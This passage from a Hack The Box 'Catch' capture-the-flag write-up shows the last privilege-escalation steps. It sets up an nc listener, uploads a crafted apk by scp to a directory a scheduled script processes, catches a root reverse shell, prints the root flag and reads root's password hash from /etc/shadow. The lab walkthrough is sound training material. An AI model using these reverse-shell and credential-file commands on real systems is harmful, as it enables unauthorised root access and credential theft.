catchv1.0.apk
```

Let's start ```nc``` listener on port ```4242```:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
```

Uploading the compiled ```apk``` to ```/opt/mdm/apk_bin```:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ scp catch/dist/catchv1.0.apk will@catch.htb:/opt/mdm/apk_bin
will@catch.htb's password: 
catchv1.0.apk
```

And after the next schedule of the script we get a reverse shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from status.catch.htb [10.10.11.150] 32972
bash: cannot set terminal process group (114243): Inappropriate ioctl for device
bash: no job control in this shell
root@catch:~# whoami && hostname && cat /root/root.txt
whoami && hostname && cat /root/root.txt
root
catch
fb46a12f7fe318ab988f1c29858c777d
```

And we get the root flag ```fb46a12f7fe318ab988f1c29858c777d```.


PDF password:
```console
root@catch:~# cat /etc/shadow | grep root | cut -d':' -f2
$6$HJWtdM63SqnL6alL$h/FUZ0TNaCCrCgEzeuT9ityQcDmYcMCA0fErrvkZVBmf0TQJntGSRMDo.AXZA9V00.qAsZ04554.dUJcFszUM1
```